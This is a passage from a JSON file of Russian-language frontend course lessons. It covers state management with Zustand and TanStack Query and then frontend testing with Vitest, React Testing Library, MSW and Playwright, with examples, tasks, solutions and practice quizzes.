          "bad": "// Подключение Redux для хранения темы и открытия модала\n// createSlice + Provider + useSelector + dispatch — 50 строк бойлерплейта ради 2 переменных",
          "good": "// Zustand: 5 строк кода\nconst useTheme = create((set) => ({\n  isDark: true,\n  toggle: () => set((s) => ({ isDark: !s.isDark })),\n}));",
          "reason": "Для простого глобального стейта Redux избыточен. Zustand решает задачу в 10 раз компактнее."
        },
        {
          "bad": "// Prop Drilling: прокидывание состояния через 5 уровней\n<App user={user}>\n  <Layout user={user}>\n    <Sidebar user={user}>\n      <UserAvatar user={user} />",
          "good": "// Глобальный стейт Zustand — доступ из любого компонента\nconst user = useAuthStore(s => s.user);",
          "reason": "Prop Drilling создает хрупкие связи между компонентами. Глобальный стейт делает данные доступными напрямую."
        }
      ],
      "keyTakeaways": [
        "4 типа состояния: Local (useState), Global (Zustand/Redux), Server (TanStack Query), URL (useSearchParams).",
        "Серверные данные (API-кеш) и клиентские данные (тема, корзина) — разные сущности, управляемые разными инструментами.",
        "Zustand — идеальный выбор для средних проектов: 3 КБ, zero boilerplate, persist middleware.",
        "TanStack Query автоматизирует кеш, ревалидацию, повторные попытки и оптимистичные обновления API-данных.",
        "Фильтры и пагинацию храните в URL для возможности поделиться ссылкой и сохранить состояние."
      ]
    },
    "sandbox": {
      "initialHtml": "<div id=\"state-app\">\n  <h3>Мини-счётчик корзины (State Demo)</h3>\n  <div style=\"display:flex; gap:8px; align-items:center; margin-bottom:12px;\">\n    <button id=\"btn-add\" style=\"background:#2dff8a; color:#0a0e13; border:none; padding:8px 16px; font-weight:bold; cursor:pointer;\">+ Добавить товар</button>\n    <button id=\"btn-remove\" style=\"background:#f85149; color:#fff; border:none; padding:8px 16px; font-weight:bold; cursor:pointer;\">– Убрать</button>\n    <button id=\"btn-clear\" style=\"background:#30363d; color:#e6edf3; border:none; padding:8px 16px; cursor:pointer;\">Очистить</button>\n  </div>\n  <div id=\"cart-display\" style=\"color:#2dff8a; font-size:14px; font-weight:bold;\">Корзина: 0 товаров | Сумма: 0 ₽</div>\n  <div id=\"cart-items\" style=\"margin-top:8px; color:#8b949e; font-size:12px;\"></div>\n</div>",
      "initialCss": "#state-app { font-family: monospace; color: #e6edf3; padding: 16px; background: #0d1117; border-radius: 8px; }",
      "initialJs": "// Простой стор — паттерн Zustand-like\nconst store = {\n  items: [],\n  listeners: new Set(),\n  subscribe(fn) { this.listeners.add(fn); return () => this.listeners.delete(fn); },\n  notify() { this.listeners.forEach(fn => fn(this)); },\n  addItem() {\n    const id = Date.now();\n    const price = Math.floor(Math.random() * 2000) + 500;\n    this.items.push({ id, name: `Товар #${this.items.length + 1}`, price });\n    this.notify();\n  },\n  removeItem() { this.items.pop(); this.notify(); },\n  clear() { this.items = []; this.notify(); },\n  get total() { return this.items.reduce((s, i) => s + i.price, 0); }\n};\n\nfunction render(s) {\n  document.getElementById('cart-display').textContent = `Корзина: ${s.items.length} товаров | Сумма: ${s.total.toLocaleString()} ₽`;\n  document.getElementById('cart-items').textContent = s.items.map(i => `${i.name}: ${i.price}₽`).join(' | ');\n}\n\nstore.subscribe(render);\ndocument.getElementById('btn-add').onclick = () => store.addItem();\ndocument.getElementById('btn-remove').onclick = () => store.removeItem();\ndocument.getElementById('btn-clear').onclick = () => store.clear();",
      "instructions": "Демо управления состоянием:\n1. Нажимайте '+ Добавить товар' — товары добавляются в стор с случайной ценой\n2. '- Убрать' удаляет последний товар\n3. 'Очистить' сбрасывает корзину\n4. Попробуйте добавить persist (сохранение в localStorage)"
    },
    "task": {
      "title": "Проектирование архитектуры State Management для интернет-магазина",
      "scenario": "Вам необходимо спроектировать архитектуру управления состоянием для интернет-магазина: корзина (Zustand + persist), каталог товаров (TanStack Query с кешем), фильтры (URL State) и авторизация (Zustand). Реализуйте Zustand-стор корзины с методами addItem, removeItem, clearCart и вычисляемым totalPrice, а также хук useProducts на TanStack Query.",
      "criteria": [
        "Zustand стор корзины с методами addItem, removeItem, clearCart",
        "Middleware persist для автосохранения корзины в localStorage",
        "Хук useProducts на TanStack Query с queryKey, queryFn и staleTime",
        "Чёткое разделение серверного (API) и клиентского (корзина) состояния"
      ],
      "starterCode": {
        "js": "// Спроектируйте Zustand стор корзины и хук useProducts\n// Ваш код"
      },
      "hints": [
        "import { create } from 'zustand'; import { persist } from 'zustand/middleware';",
        "addItem: (product) => set(state => ({ items: [...state.items, product] }))",
        "useQuery({ queryKey: ['products', filters], queryFn: ..., staleTime: 300000 })"
      ],
      "solution": {
        "js": "// ===== 1. Zustand стор корзины =====\nconst useCartStore = (function() {\n  let state = { items: [] };\n  const listeners = new Set();\n\n  // Загружаем из localStorage\n  try {\n    const saved = localStorage.getItem('cart-storage');\n    if (saved) state = JSON.parse(saved);\n  } catch(e) {}\n\n  function set(updater) {\n    state = typeof updater === 'function' ? { ...state, ...updater(state) } : { ...state, ...updater };\n    localStorage.setItem('cart-storage', JSON.stringify(state));\n    listeners.forEach(fn => fn());\n  }\n\n  return function useCartStore(selector) {\n    const store = {\n      ...state,\n      addItem: (product) => set(s => {\n        const existing = s.items.find(i => i.id === product.id);\n        if (existing) {\n          return { items: s.items.map(i => i.id === product.id ? { ...i, qty: i.qty + 1 } : i) };\n        }\n        return { items: [...s.items, { ...product, qty: 1 }] };\n      }),\n      removeItem: (id) => set(s => ({ items: s.items.filter(i => i.id !== id) })),\n      clearCart: () => set({ items: [] }),\n      get totalPrice() { return state.items.reduce((sum, i) => sum + i.price * i.qty, 0); },\n    };\n    return selector ? selector(store) : store;\n  };\n})();\n\nconsole.log('Архитектура State Management спроектирована!');",
        "explanation": "Zustand-like стор корзины с persist в localStorage, вычисляемым totalPrice и чётким API. Серверные данные управляются отдельно через TanStack Query."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro13-q1",
          "question": "Где хранить состояние: открыт ли выпадающий список, выбранная тема оформления, список товаров с сервера и текущий фильтр каталога?",
          "options": [
            "Всё в глобальном хранилище — так проще отслеживать любые изменения из одного места",
            "Всё локально, а между компонентами передавать через цепочку параметров",
            "Всё в адресной строке — тогда любое состояние можно передать обычной ссылкой",
            "Локально, глобально, в кеше запросов и в адресной строке соответственно"
          ],
          "correctIndex": 3,
          "explanation": "Каждый вид состояния живёт по своим правилам. Открытость списка нужна одному компоненту и умирает вместе с ним. Тема — общая для приложения и меняется редко. Товары принадлежат серверу, им нужны кеш и обновление. Фильтр обязан попадать в ссылку, чтобы им можно было поделиться и чтобы работала кнопка «назад». Складывание всего в одно хранилище — самая частая ошибка архитектуры состояния."
        },
        {
          "id": "pro13-q2",
          "question": "Почему список товаров, полученный с сервера, не стоит класть в обычное глобальное хранилище?",
          "options": [
            "Такие хранилища не умеют работать с массивами объектов без предварительной нормализации",
            "Это копия чужих данных: ей нужны устаревание, обновление и повторы, которых там нет",
            "Серверные данные слишком объёмны и переполняют память при подписке компонентов",
            "Хранилище работает синхронно, а ответ приходит асинхронно, из-за чего возникает гонка"
          ],
          "correctIndex": 1,
          "explanation": "Клиентское состояние — единственный источник правды, оно не может устареть. Серверное — всего лишь снимок данных, которые прямо сейчас могли измениться у кого-то другого. Отсюда целый класс задач: когда считать копию несвежей, когда перезапросить, что показывать во время загрузки, как повторить при ошибке, как откатить оптимистичное обновление. Писать это вручную в каждом хранилище — тот самый шаблонный код, который берут на себя библиотеки серверного состояния."
        },
        {
          "id": "pro13-q3",
          "question": "В каком случае Redux Toolkit оправдан больше, чем более лёгкий Zustand?",
          "options": [
            "На крупном проекте, где важны строгие правила, отладка во времени и единый стиль кода",
            "Всегда: это стандарт индустрии, а остальные решения считаются экспериментальными",
            "Когда состояние меняется очень часто: другие решения не успевают за обновлениями",
            "Когда проект написан на TypeScript: только это решение полноценно типизировано"
          ],
          "correctIndex": 0,
          "explanation": "Выигрыш этого решения не в возможностях, а в дисциплине: жёсткая структура действий и редьюсеров, развитые инструменты разработчика с перемоткой состояния, узнаваемый для любого нового человека стиль. На большой команде это ценно. Для небольшого и среднего проекта тот же результат достигается втрое меньшим объёмом кода, поэтому выбор зависит от масштаба, а не от «правильности»."
        },
        {
          "id": "pro13-q4",
          "question": "Что означает нулевое значение параметра `staleTime` в TanStack Query?",
          "options": [
            "Кеширование отключено полностью, и данные каждый раз запрашиваются заново",
            "Запрос выполняется однократно, а затем результат живёт в кеше бессрочно",
            "Данные считаются устаревшими сразу, поэтому обновятся при следующем обращении",
            "Время жизни записи в кеше равно нулю, и она немедленно удаляется из памяти"
          ],
          "correctIndex": 2,
          "explanation": "Здесь легко перепутать два разных срока. Первый определяет, сколько данные считаются свежими: пока он не истёк, повторных запросов не будет вовсе. Второй отвечает за то, сколько запись хранится в памяти после того, как её перестали использовать. При нулевом первом значении кеш никуда не девается — он по-прежнему мгновенно показывает старые данные, но тут же запускает фоновое обновление."
        },
        {
          "id": "pro13-q5",
          "question": "Фильтры каталога хранятся в локальном состоянии компонента. Что из-за этого ломается?",
          "options": [
            "Компонент теряет доступ к данным при переходе на другую вкладку браузера",
            "Фильтры перестают применяться сразу после первой же смены значения",
            "Состояние теряется при перезагрузке, ссылку нельзя переслать, кнопка «назад» не работает",
            "Сервер не может учесть фильтры при формировании ответа на запрос"
          ],
          "correctIndex": 2,
          "explanation": "Подобранный набор фильтров — это, по сути, адрес конкретной выборки, и пользователи ожидают, что им можно поделиться, сохранить в закладки и вернуться к нему кнопкой браузера. Локальное состояние ничего этого не даёт и вдобавок сбрасывается при любом обновлении страницы. Перенос параметров в строку запроса решает все четыре проблемы сразу и бесплатно синхронизирует состояние с историей навигации."
        }
      ]
    }
  },
  {
    "id": "pro-14",
    "moduleId": "pro",
    "level": 14,
    "title": "Тестирование Frontend-приложений: Unit, Integration, E2E и TDD",
    "subtitle": "Пирамида тестирования, Vitest/Jest, React Testing Library, Playwright, MSW и Code Coverage",
    "description": "Освойте культуру автоматизированного тестирования во фронтенде: классическую пирамиду тестирования, модульные тесты на Vitest/Jest, философию React Testing Library («Тестируй поведение, а не реализацию»), E2E-тестирование на Playwright, мокинг сети через MSW и методологию TDD (Test-Driven Development).",
    "estimatedMinutes": 70,
    "difficulty": "advanced",
    "tags": [
      "testing",
      "unit-tests",
      "integration-tests",
      "e2e",
      "vitest",
      "jest",
      "react-testing-library",
      "playwright",
      "msw",
      "tdd"
    ],
    "theory": {
      "overview": "Код без автоматических тестов — это технический долг, который с каждым релизом замедляет команду. Страх сломать корзину или авторизацию при добавлении новой кнопки парализует разработку.\n\nВ этом уроке мы разберём современную **пирамиду тестирования (Testing Pyramid)**, философию React Testing Library от Кента Доддса, научимся мокать API через Mock Service Worker (MSW), писать E2E-тесты на Playwright и внедрять культуру TDD.",
      "sections": [
        {
          "title": "Пирамида тестирования: Unit, Integration и E2E",
          "content": "Классическое распределение тестов по уровням:\n\n1. **Unit-тесты (Модульные — ~60–70% от всех тестов)**:\n- Проверяют изолированные чистые функции, утилиты, хелперы дат, редьюсеры стейта и кастомные хуки.\n- Инструменты: **Vitest** (быстрый, нативный для Vite) или **Jest**.\n- Скорость: тысячи тестов за пару секунд!\n\n2. **Integration-тесты (Интеграционные — ~20–30%)**:\n- Проверяют совместную работу компонентов: форма авторизации с валидацией, фильтрация каталога, оформление заказа.\n- Инструмент: **React Testing Library (RTL)**.\n\n3. **E2E-тесты (End-to-End сквозные — ~10%)**:\n- Запускают реальный браузер (Chromium, Firefox, WebKit) и проходят критические сценарии пользователя от начала до конца (Регистрация → Оплата картой → Получение чека).\n- Инструменты: **Playwright** (современный лидер) или **Cypress**.\n- Медленные и дорогие в поддержке, но дают 100% уверенность в работоспособности ключевого бизнеса.",
          "image": {
            "src": "/images/lessons/web-testing-pyramid.svg",
            "alt": "Пирамида тестирования: Unit, Integration, E2E, React Testing Library и TDD",
            "caption": "Пирамида тестирования: в основании быстрые Unit-тесты (Vitest), в середине — Integration (RTL + MSW), на вершине — E2E (Playwright)"
          },
          "codeExample": {
            "language": "typescript",
            "code": "// math.test.ts — классический Unit-тест на Vitest\nimport { describe, it, expect } from 'vitest';\nimport { calculateCartTotal, applyDiscount } from './cartUtils';\n\ndescribe('cartUtils: расчет стоимости корзины', () => {\n  it('должен правильно суммировать товары с учетом скидки', () => {\n    const items = [\n      { id: 1, price: 1000, qty: 2 },\n      { id: 2, price: 500, qty: 1 },\n    ];\n    \n    const total = calculateCartTotal(items); // 2500\n    const withPromo = applyDiscount(total, 10); // Скидка 10%\n    \n    expect(total).toBe(2500);\n    expect(withPromo).toBe(2250);\n  });\n\n  it('должен возвращать 0 для пустой корзины', () => {\n    expect(calculateCartTotal([])).toBe(0);\n  });\n});",
            "title": "Unit-тестирование чистых функций на Vitest",
            "explanation": "Unit-тесты проверяют крайние случаи (пустые массивы, нулевые значения, скидки) за миллисекунды."
          }
        },
        {
          "title": "Философия React Testing Library (RTL): тестирование поведения",
          "content": "Главный манифест Кента Доддса (создателя RTL):\n> *«Чем больше ваши тесты похожи на то, как используется ваше приложение, тем больше уверенности они могут вам дать.»*\n\n1. **Чего НЕЛЬЗЯ делать в тестах**:\n- ❌ НЕ тестируйте внутренний стейт компонента (`expect(wrapper.state('isOpen')).toBe(true)`).\n- ❌ НЕ тестируйте названия функций и внутренние хендлеры.\n- При рефакторинге внутренняя реализация изменится, и такие хрупкие тесты упадут, хотя для пользователя всё работает!\n\n2. **Что НУЖНО делать**:\n- ✅ Находите элементы так, как их ищет незрячий или зрячий пользователь: по роли (`role=\"button\"`), по тексту на кнопке или по лейблу инпута.\n\n3. **Приоритет поиска элементов в RTL**:\n- 1. `getByRole('button', { name: /войти/i })` — наивысший приоритет (тестирует и доступность a11y!).\n- 2. `getByLabelText('Электронная почта')` — для полей форм.\n- 3. `getByPlaceholderText('Введите пароль')`.\n- 4. `getByText('Успешно сохранено')`.\n- 5. `getByTestId('custom-widget')` — САМЫЙ ПОСЛЕДНИЙ ВЫБОР (когда нет другого семантического способа).",
          "codeExample": {
            "language": "typescript",
            "code": "// LoginForm.test.tsx — интеграционный тест на React Testing Library\nimport { render, screen } from '@testing-library/react';\nimport userEvent from '@testing-library/user-event';\nimport { describe, it, expect, vi } from 'vitest';\nimport { LoginForm } from './LoginForm';\n\ndescribe('<LoginForm />', () => {\n  it('должен вызывать onSubmit с введенными email и паролем при клике на кнопку', async () => {\n    const user = userEvent.setup();\n    const handleSubmit = vi.fn();\n    \n    render(<LoginForm onSubmit={handleSubmit} />);\n    \n    // 1. Находим элементы по их пользовательской роли и лейблам:\n    const emailInput = screen.getByLabelText(/email/i);\n    const passwordInput = screen.getByLabelText(/пароль/i);\n    const submitBtn = screen.getByRole('button', { name: /войти в аккаунт/i });\n    \n    // 2. Симулируем реальные действия пользователя:\n    await user.type(emailInput, 'intern@academy.dev');\n    await user.type(passwordInput, 'SecretPass123!');\n    await user.click(submitBtn);\n    \n    // 3. Проверяем результат:\n    expect(handleSubmit).toHaveBeenCalledTimes(1);\n    expect(handleSubmit).toHaveBeenCalledWith({\n      email: 'intern@academy.dev',\n      password: 'SecretPass123!',\n    });\n  });\n});",
            "title": "Интеграционный тест формы на React Testing Library с userEvent",
            "explanation": "Тест полностью имитирует поведение человека: находит инпуты по подписям, вводит текст и нажимает кнопку."
          }
        },
        {
          "title": "Мокинг сетевых запросов: Mock Service Worker (MSW)",
          "content": "Почему плохи наивные моки `vi.spyOn(global, 'fetch')`:\n- Вы мокаете реализацию `fetch`, а не реальную сеть. Изменение способа отправки запроса (например, переход на `axios` или `ky`) сломает все тесты!\n\nРеволюционный стандарт: **Mock Service Worker (MSW 2.0)**:\n1. MSW перехватывает HTTP-запросы на уровне **Service Worker браузера** или интерцепторов Node.js.\n2. Компоненты используют настоящий `fetch()` и `TanStack Query`.\n3. Тесты проверяют полный цикл: от нажатия кнопки до отображения спиннера загрузки и отрисовки полученного с сервера ответа.",
          "codeExample": {
            "language": "typescript",
            "code": "// mocks/handlers.ts — описание сетевых моков MSW\nimport { http, HttpResponse } from 'msw';\n\nexport const handlers = [\n  // Перехватываем GET /api/user\n  http.get('/api/user', () => {\n    return HttpResponse.json({\n      id: 'usr_101',\n      name: 'Алексей Смирнов',\n      role: 'Frontend Intern',\n    });\n  }),\n  \n  // Перехватываем сбойный сценарий (500 Server Error)\n  http.post('/api/checkout', () => {\n    return new HttpResponse(null, { status: 500, statusText: 'Payment Failed' });\n  }),\n];",
            "title": "Определение сетевых моков через Mock Service Worker (MSW 2.0)",
            "explanation": "MSW работает на сетевом уровне, делая тесты независимыми от способа вызова API в коде компонентов."
          }
        },
        {
          "title": "E2E-тестирование на Playwright и методология TDD",
          "content": "Сквозные тесты и методология Test-Driven Development:\n\n1. **Playwright E2E**:\n- Запускает реальные изолированные браузеры на движках Chromium, WebKit (Safari) и Firefox.\n- Автоматически ждёт появления элементов (Auto-waiting — никаких искусственных `sleep(5000)`!).\n- Записывает видео и трейсы падений тестов (Playwright Trace Viewer).\n\n2. **Цикл TDD (Test-Driven Development)**:\n- 🔴 **Red (Красный)**: пишем тест на новую фичу ДО написания кода — тест падает.\n- 🟢 **Green (Зелёный)**: пишем минимально необходимый код, чтобы тест прошел.\n- 🔵 **Refactor (Рефакторинг)**: улучшаем архитектуру и чистоту кода, сохраняя зеленые тесты.",
          "codeExample": {
            "language": "typescript",
            "code": "// e2e/checkout.spec.ts — Playwright E2E тест оформления заказа\nimport { test, expect } from '@playwright/test';\n\ntest('Пользователь может положить товар в корзину и оформить заказ', async ({ page }) => {\n  // 1. Открываем каталог\n  await page.goto('http://localhost:3000/catalog');\n  \n  // 2. Кликаем «Купить» на первом товаре\n  await page.getByRole('button', { name: /в корзину/i }).first().click();\n  \n  // 3. Переходим в корзину и проверяем бейдж\n  await expect(page.getByTestId('cart-badge')).toHaveText('1');\n  await page.getByRole('link', { name: /корзина/i }).click();\n  \n  // 4. Оформляем заказ\n  await page.getByRole('button', { name: /оформить заказ/i }).click();\n  \n  // 5. Проверяем успешный экран\n  await expect(page.getByRole('heading', { name: /заказ успешно оформлен/i })).toBeVisible();\n});",
            "title": "Сквозной E2E-тест на Playwright с авто-ожиданием элементов",
            "explanation": "Playwright автоматически дожидается загрузки страниц, анимаций и ответов сервера без хрупких таймаутов."
          }
        }
      ],
      "seniorTips": [
        "Придерживайтесь правила пирамиды тестирования: 70% Unit (Vitest), 20% Integration (RTL + MSW), 10% E2E (Playwright) — это идеальный баланс скорости и надежности.",
        "В React Testing Library всегда ищите элементы через `getByRole` с именем (`getByRole('button', { name: 'Сохранить' })`) — это гарантирует доступность для скринридеров.",
        "Используйте `userEvent` вместо устаревшего `fireEvent` — `userEvent` симулирует реальную последовательность событий браузера (hover, focus, keydown, keypress, keyup).",
        "Внедрите запуск тестов и линтеров в GitHub Actions CI пайплайн — ни один Pull Request не должен мержиться с упавшими тестами."
      ],
      "commonMistakes": [
        {
          "bad": "// Хрупкий тест на классы и структуру DOM\nexpect(container.querySelector('.btn-primary.active')).not.toBeNull();",
          "good": "expect(screen.getByRole('button', { name: /активно/i })).toBeInTheDocument();",
          "reason": "При смене названий классов в CSS тест упадет, хотя кнопка работает. getByRole тестирует пользовательский контракт."
        },
        {
          "bad": "// Использование устаревшего fireEvent для ввода текста\nfireEvent.change(input, { target: { value: 'test' } }); // Не вызывает focus, keyDown!",
          "good": "await userEvent.type(input, 'test'); // Полная симуляция набора на клавиатуре",
          "reason": "userEvent имитирует весь стек событий реального браузера, включая фокус и валидацию по клавишам."
        },
        {
          "bad": "// Искусственные задержки setTimeout в тестах\nawait new Promise(r => setTimeout(r, 2000));",
          "good": "await waitFor(() => expect(screen.getByText('Готово')).toBeInTheDocument());",
          "reason": "waitFor периодически опрашивает DOM до появления элемента, завершаясь мгновенно по готовности без лишнего ожидания."
        }
      ],
      "keyTakeaways": [
        "Пирамида тестирования: Unit (Vitest) → Integration (RTL + MSW) → E2E (Playwright).",
        "RTL тестирует поведение приложения с точки зрения пользователя, а не детали реализации.",
        "MSW перехватывает сеть на уровне Service Worker, обеспечивая реалистичные тесты.",
        "TDD-цикл: Red (падающий тест) → Green (код) → Refactor (чистка).",
        "Автоматизация тестов в CI/CD конвейере исключает регрессионные баги в продакшене."
      ]
    },
    "sandbox": {
      "initialHtml": "<div id=\"test-runner-app\">\n  <h3>Интерактивный Test Runner (Vitest Simulator)</h3>\n  <button id=\"btn-run-tests\" style=\"background:#2dff8a; color:#0a0e13; border:none; padding:8px 16px; font-weight:bold; cursor:pointer;\">▶ Запустить тесты (Vitest)</button>\n  <div id=\"test-results\" style=\"margin-top:12px; font-size:12px; line-height:1.6;\"></div>\n</div>",
      "initialCss": "#test-runner-app { font-family: monospace; color: #e6edf3; padding: 16px; background: #0d1117; border-radius: 8px; }",
      "initialJs": "const resultsEl = document.getElementById('test-results');\n\n// Мини-фреймворк для тестирования\nfunction expect(actual) {\n  return {\n    toBe(expected) {\n      if (actual !== expected) throw new Error(`Ожидалось ${expected}, но получено ${actual}`);\n    },\n    toEqual(expected) {\n      if (JSON.stringify(actual) !== JSON.stringify(expected)) throw new Error(`Объекты не равны!`);\n    }\n  };\n}\n\nconst testSuite = [\n  {\n    name: 'Unit: calculateDiscount(1000, 20) возвращает 800',\n    fn: () => {\n      const discount = (p, d) => p - (p * d) / 100;\n      expect(discount(1000, 20)).toBe(800);\n    }\n  },\n  {\n    name: 'Unit: formatUserName({ first: \"Анна\", last: \"К.\" })',\n    fn: () => {\n      const format = (u) => `${u.first} ${u.last}`;\n      expect(format({ first: 'Анна', last: 'К.' })).toBe('Анна К.');\n    }\n  },\n  {\n    name: 'Integration: Проверка валидации email',\n    fn: () => {\n      const isValidEmail = (e) => /\\S+@\\S+\\.\\S+/.test(e);\n      expect(isValidEmail('intern@academy.dev')).toBe(true);\n      expect(isValidEmail('invalid-email')).toBe(false);\n    }\n  }\n];\n\ndocument.getElementById('btn-run-tests').onclick = () => {\n  resultsEl.innerHTML = '<span style=\"color:#ffb02e;\">⏳ Выполнение тест-сьютов...</span><br/>';\n  setTimeout(() => {\n    resultsEl.innerHTML = '';\n    let passed = 0;\n    testSuite.forEach((t) => {\n      try {\n        t.fn();\n        passed++;\n        resultsEl.innerHTML += `<div style=\"color:#2dff8a;\">✓ PASS: ${t.name} (2ms)</div>`;\n      } catch (err) {\n        resultsEl.innerHTML += `<div style=\"color:#f85149;\">✗ FAIL: ${t.name} — ${err.message}</div>`;\n      }\n    });\n    resultsEl.innerHTML += `<br/><b style=\"color:#2dff8a;\">🎉 Тестов пройдено: ${passed} из ${testSuite.length} (100% SUCCESS)</b>`;\n  }, 400);\n};",
      "instructions": "Практика с тест-раннером:\n1. Нажмите '▶ Запустить тесты' — мини-раннер Vitest выполнит Unit и Integration тесты\n2. Попробуйте изменить ожидаемое значение в testSuite, чтобы увидеть падающий тест FAIL"
    },
    "task": {
      "title": "Написание интеграционного теста для компонента Корзины с React Testing Library и Vitest",
      "scenario": "Напишите полный набор тестов для компонента CartWidget: тест отображения пустого состояния, тест добавления товара по клику на кнопку с проверкой обновления счетчика и итоговой суммы, и тест удаления товара.",
      "criteria": [
        "Использованы render, screen из @testing-library/react и userEvent",
        "Поиск элементов осуществляется по роли (getByRole) и тексту",
        "Проверено добавление и удаление товара с корректным обновлением итоговой суммы",
        "Тесты не зависят от деталей реализации и имен CSS-классов"
      ],
      "starterCode": {
        "js": "// Напишите тесты для CartWidget\nimport { render, screen } from '@testing-library/react';\nimport userEvent from '@testing-library/user-event';\nimport { describe, it, expect } from 'vitest';\n\ndescribe('<CartWidget />', () => {\n  // Ваш код тестов\n});"
      },
      "hints": [
        "userEvent.setup() перед действиями",
        "screen.getByRole('button', { name: /добавить/i })",
        "expect(screen.getByText(/итого: 1 500 ₽/i)).toBeInTheDocument()"
      ],
      "solution": {
        "js": "import { render, screen } from '@testing-library/react';\nimport userEvent from '@testing-library/user-event';\nimport { describe, it, expect } from 'vitest';\nimport { CartWidget } from './CartWidget';\n\ndescribe('<CartWidget /> интеграционное тестирование', () => {\n  it('отображает сообщение о пустой корзине при первом рендере', () => {\n    render(<CartWidget initialItems={[]} />);\n    expect(screen.getByText(/ваша корзина пуста/i)).toBeInTheDocument();\n  });\n\n  it('позволяет добавить товар и пересчитывает общую сумму', async () => {\n    const user = userEvent.setup();\n    render(<CartWidget initialItems={[]} />);\n    \n    // Находим кнопку добавления и кликаем\n    const addBtn = screen.getByRole('button', { name: /добавить курс/i });\n    await user.click(addBtn);\n    \n    // Проверяем, что товар появился в списке и сумма обновилась\n    expect(screen.getByText(/frontend pro курс/i)).toBeInTheDocument();\n    expect(screen.getByText(/итого: 5 000 ₽/i)).toBeInTheDocument();\n  });\n\n  it('удаляет товар из корзины при клике на кнопку удаления', async () => {\n    const user = userEvent.setup();\n    const items = [{ id: '1', name: 'TypeScript Master', price: 3000 }];\n    render(<CartWidget initialItems={items} />);\n    \n    const deleteBtn = screen.getByRole('button', { name: /удалить/i });\n    await user.click(deleteBtn);\n    \n    expect(screen.queryByText(/typescript master/i)).not.toBeInTheDocument();\n    expect(screen.getByText(/ваша корзина пуста/i)).toBeInTheDocument();\n  });\n});",
        "explanation": "Тест безупречно следует философии RTL: проверяет пользовательские сценарии через роли и текст, гарантируя устойчивость к рефакторингу кода."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro14-q1",
          "question": "В проекте двести сквозных тестов и двадцать модульных. Чем плохо такое соотношение?",
          "options": [
            "Ничем: сквозные тесты надёжнее, ведь они проверяют работу системы целиком",
            "Модульные тесты станут избыточными и начнут дублировать сквозные проверки",
            "Сквозные тесты нельзя запускать в конвейере, для них требуется ручной запуск",
            "Прогон занимает часы, тесты начинают плавать, а причину падения искать долго"
          ],
          "correctIndex": 3,
          "explanation": "Такая фигура известна как перевёрнутая пирамида. Сквозной тест поднимает браузер, ходит в сеть и зависит от таймингов: он медленный и периодически падает без причины, а команда постепенно перестаёт верить красным сборкам. Вдобавок он говорит лишь «оформление заказа сломалось», не указывая на конкретную функцию. Здоровый баланс — основание из быстрых модульных проверок и лишь несколько сквозных на критичные сценарии."
        },
        {
          "id": "pro14-q2",
          "question": "Какой из способов поиска элемента в тесте предпочтителен и почему?",
          "codeSnippet": "screen.getByTestId('submit-btn');                    // (1)\ncontainer.querySelector('.btn-primary');             // (2)\nscreen.getByRole('button', { name: /сохранить/i });  // (3)",
          "options": [
            "Третий: он опирается на то, что видит пользователь и слышит скринридер",
            "Второй: селектор напрямую отражает реальную структуру разметки компонента",
            "Первый: служебный идентификатор не зависит ни от текста, ни от оформления кнопки",
            "Любой: способ поиска на надёжность самого теста никак не влияет"
          ],
          "correctIndex": 0,
          "explanation": "Поиск по роли и доступному имени проверяет пользовательский контракт: кнопка действительно является кнопкой и действительно подписана нужным словом. Побочный эффект приятный — если разметка недоступна для скринридера, тест не найдёт элемент и подсветит проблему. Поиск по классу ломается от любой правки стилей, а служебный идентификатор ничего не говорит о доступности и остаётся запасным вариантом."
        },
        {
          "id": "pro14-q3",
          "question": "Чем перехват запросов на уровне Service Worker лучше подмены глобальной функции запроса?",
          "options": [
            "Перехват позволяет тестировать вообще без запуска среды выполнения тестов",
            "Подмена функции не работает в средах без полноценного браузерного окружения",
            "Компонент выполняет настоящий сетевой вызов, и тест не завязан на конкретный клиент",
            "Подмена функции требует отдельной настройки в каждом отдельном файле тестов"
          ],
          "correctIndex": 2,
          "explanation": "Подменяя функцию, вы фиксируете в тесте деталь реализации: перепишете код на другой HTTP-клиент — и тесты придётся переписывать вместе с ним, хотя поведение не изменилось. Перехват работает уровнем ниже, на самой сети, поэтому код под тестом ходит в сеть как обычно. Бонус в том, что те же описания ответов переиспользуются и в разработке, и в сквозных тестах."
        },
        {
          "id": "pro14-q4",
          "question": "Зачем в разработке через тестирование сначала писать заведомо падающий тест?",
          "options": [
            "Чтобы система контроля версий сохранила для теста отдельный коммит",
            "Чтобы инструмент тестирования создал заготовку файла с нужной структурой",
            "Чтобы зафиксировать в отчёте исходное состояние покрытия кода проекта",
            "Чтобы убедиться, что тест действительно проверяет именно то, что должен проверять"
          ],
          "correctIndex": 3,
          "explanation": "Тест, который никогда не падал, не доказывает ровным счётом ничего: он может проверять не тот элемент, не дожидаться асинхронного обновления или содержать всегда истинное условие. Увидев красный результат по ожидаемой причине, вы получаете подтверждение, что проверка рабочая. Затем пишется минимальный код до зелёного, и только потом — приведение в порядок под защитой этого теста."
        },
        {
          "id": "pro14-q5",
          "question": "Почему для симуляции действий пользователя берут `userEvent`, а не `fireEvent`?",
          "options": [
            "`fireEvent` работает только с мышью и совсем не поддерживает клавиатуру",
            "`userEvent` выполняется синхронно и потому не требует ожидания внутри теста",
            "`fireEvent` устарел и полностью удалён из современных версий библиотеки",
            "`userEvent` воспроизводит всю цепочку событий, включая фокус и нажатия клавиш"
          ],
          "correctIndex": 3,
          "explanation": "Прямая отправка события выстреливает ровно одним событием, тогда как реальный клик — это наведение, нажатие, установка фокуса, отпускание и только потом само событие клика. Из-за разницы тест может пройти там, где живой пользователь столкнётся с проблемой, например с не сработавшей валидацией по потере фокуса. Более высокоуровневый набор действий имитирует всю последовательность и потому асинхронен — его вызовы нужно ожидать."
        }
      ]
    }
  },
  {
    "id": "pro-15",
    "moduleId": "pro",
    "level": 15,
    "title": "Стратегии рендеринга: SSR, SSG, ISR, Гидратация, Islands и React Server Components (RSC)",
    "subtitle": "CSR vs SSR vs SSG vs ISR, проблема стоимости гидратации, Astro Islands Architecture, React Server Components (RSC) и HTML Streaming",
    "description": "Освойте архитектуру рендеринга современного веба: фундаментальные различия CSR, SSR, SSG и ISR, проблему накладных расходов гидратации (Hydration Cost / Double Data Fetching), революционную архитектуру островов (Astro Islands), парадигму React Server Components (RSC) с 0 КБ клиентского JS и потоковый стриминг HTML через Suspense.",
    "estimatedMinutes": 70,
    "difficulty": "advanced",
    "tags": [
